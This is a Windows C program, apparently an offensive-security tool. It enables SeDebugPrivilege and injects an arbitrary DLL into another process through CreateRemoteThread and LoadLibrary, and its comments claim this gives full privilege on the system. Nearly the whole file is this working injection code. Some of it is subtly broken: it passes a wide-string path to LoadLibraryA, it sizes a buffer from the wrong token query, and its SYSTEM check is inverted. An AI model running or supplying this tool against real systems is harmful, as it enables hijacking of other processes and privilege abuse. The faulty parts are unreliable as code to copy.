/*
Reference:https://github.com/hatRiot/token-priv
Enable the SeDebugPrivilege of current process and then we can inject a dll into the process. 

We will have full privilege on the system.
*/




#include <windows.h>
#include <assert.h>
#include <tlhelp32.h>

#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 

BOOL InjectDll(UINT32 ProcessId, LPWSTR DllPath)
{
	if (wcsstr(DllPath, L"\\\\") != 0)
	{
		printf("[!]Wrong Dll path\n");
		return FALSE;
	}
	if (wcsstr(DllPath, L"\\") == 0)
	{
		printf("[!]Need Dll full path\n");
		return FALSE;
	}

	size_t len = wcslen(DllPath) + 1;

	LPVOID pThreadData = NULL;
	HANDLE ProcessHandle = NULL;
	HANDLE hThread = NULL;
	BOOL bRet = FALSE;

	__try
	{
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
		if (ProcessHandle == NULL)
		{
			printf("[!]OpenProcess error\n");
			__leave;
		}

		pThreadData = VirtualAllocEx(ProcessHandle, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pThreadData == NULL)
		{
			CloseHandle(ProcessHandle);
			printf("[!]VirtualAllocEx error\n");
			__leave;
		}

		BOOL bWriteOK = WriteProcessMemory(ProcessHandle, pThreadData, DllPath, len, NULL);
		if (!bWriteOK)
		{
			CloseHandle(ProcessHandle);
			printf("[!]WriteProcessMemory error\n");
			__leave;
		}

		LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL;
		HMODULE Kernel32Module = GetModuleHandle(L"Kernel32");
		LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, "LoadLibraryA");
		hThread = CreateRemoteThread(ProcessHandle, NULL, 0, LoadLibraryAddress, pThreadData, 0, NULL);
		if (hThread == NULL)
		{
			CloseHandle(ProcessHandle);
			printf("[!]CreateRemoteThread error\n");
			__leave;
		}

		WaitForSingleObject(hThread, INFINITE);
		bRet = TRUE;

	}
	__finally
	{
		if (pThreadData != NULL)
			VirtualFreeEx(ProcessHandle, pThreadData, 0, MEM_RELEASE);

		if (hThread != NULL)
			CloseHandle(hThread);
		if (ProcessHandle != NULL)
			CloseHandle(ProcessHandle);
	}
	return bRet;

}

BOOL FreeDll(UINT32 ProcessId, LPWSTR DllFullPath)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot;
	HMODULE hModule = NULL;
	MODULEENTRY32 me = { sizeof(me) };
	BOOL bSuccess = FALSE;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessId);
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me)) {
		if (!_tcsicmp((LPCTSTR)me.szModule, DllFullPath) || !_tcsicmp((LPCTSTR)me.szExePath, DllFullPath))
		{
			bFound = TRUE;
			break;
		}
	}
	if (!bFound) {
		CloseHandle(hSnapshot);
		return FALSE;
	}

	BOOL bRet = FALSE;
	HANDLE ProcessHandle = NULL;

	__try
	{
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
		if (ProcessHandle == NULL)
		{
			printf("[!]OpenProcess error\n");
			__leave;
		}

		LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL;
		HMODULE Kernel32Module = GetModuleHandle(L"Kernel32");
		FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, "FreeLibrary");

		HANDLE hThread = NULL;
		hThread = CreateRemoteThread(ProcessHandle, NULL, 0, FreeLibraryAddress, me.modBaseAddr, 0, NULL);
		if (hThread == NULL)
		{
			CloseHandle(ProcessHandle);
			printf("[!]CreateRemoteThread error\n");
			__leave;
		}

		WaitForSingleObject(hThread, INFINITE);
		bRet = TRUE;
	}
	__finally
	{
		if (ProcessHandle != NULL)
			CloseHandle(ProcessHandle);
	}
	return bRet;
}

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return 0;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("whoami:\n%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;
	return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
{
	UINT len = 0;
	if (attributes & SE_PRIVILEGE_ENABLED)
		len += wsprintf(szAttrbutes, TEXT("Enabled"));
	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
	if (attributes & SE_PRIVILEGE_REMOVED)
		len += wsprintf(szAttrbutes, TEXT("Removed"));
	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
		len += wsprintf(szAttrbutes, TEXT("Used for access"));
	if (szAttrbutes[0] == 0)
		wsprintf(szAttrbutes, TEXT("Disabled"));
	return;
}

int GetTokenPrivilege(HANDLE tok)
{
	PTOKEN_PRIVILEGES ppriv = NULL;
	DWORD dwRet = 0;
	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
	if (!dwRet)
		return 0;
	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
	printf("\nwhoami /priv\n");
	for (int i = 0; i < ppriv->PrivilegeCount; i++)
	{
		TCHAR lpszPriv[MAX_PATH] = { 0 };
		DWORD dwRet = MAX_PATH;
		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
		printf("%-50ws", lpszPriv);
		TCHAR lpszAttrbutes[1024] = { 0 };
		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
		printf("%ws\n", lpszAttrbutes);
	}
	return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[!]LookupPrivilegeValue error\n");
		return 0;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[!]AdjustTokenPrivileges error\n");
		return 0;
	}

	IsTokenSystem(hToken);
	GetTokenPrivilege(hToken);

	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc != 3)
	{
		printf("Use CreateRemoteThread to inject dll.\n\n");
		printf("Usage:\n");
		printf("%s <PID> <Dll Path>\n", argv[0]);
		return 0;
	}
	
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[!]OpenProcessToken error\n");
		return 0;
	}

	EnablePriv(hToken, SE_DEBUG_NAME);
	if (!InjectDll((DWORD)_wtoi(argv[1]), argv[2]))
	{
		printf("[!]InjectDll error \n");
		return 1;
	}

	if (!FreeDll((DWORD)_wtoi(argv[1]), argv[2]))
	{
		printf("[!]FreeDll error \n");
		return 1;
	}
	printf("[+]InjectDll success\n");
	return 0;
}
